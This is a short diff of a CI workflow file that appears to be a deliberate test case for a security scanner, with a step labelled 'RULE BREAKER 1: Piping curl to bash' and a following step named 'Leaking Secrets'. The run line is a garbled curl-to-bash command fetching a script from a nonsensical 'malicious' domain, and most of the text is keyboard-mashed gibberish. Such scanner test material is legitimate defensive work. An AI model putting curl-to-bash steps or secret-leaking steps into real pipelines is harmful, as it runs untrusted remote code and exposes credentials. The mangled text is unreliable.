@@ -7,7 +7,7 @@ jobs:
     steps:
       - name: This will trigger the scanneferferfvs
         # RULE BREAKER 1: Piping curl to bash
-        run:-sL http:cf vddd  c //maliciovdvdfvdfvdfvus.coriptdcsdcds.shdscsdcdcs
+        run:-sL http:cf vddd  c //maliciovdvdvfvffvdfvdfvus.coriptdcsdcds.shdscsdcdcs
 
       - name: Leaking Secrets
         env:
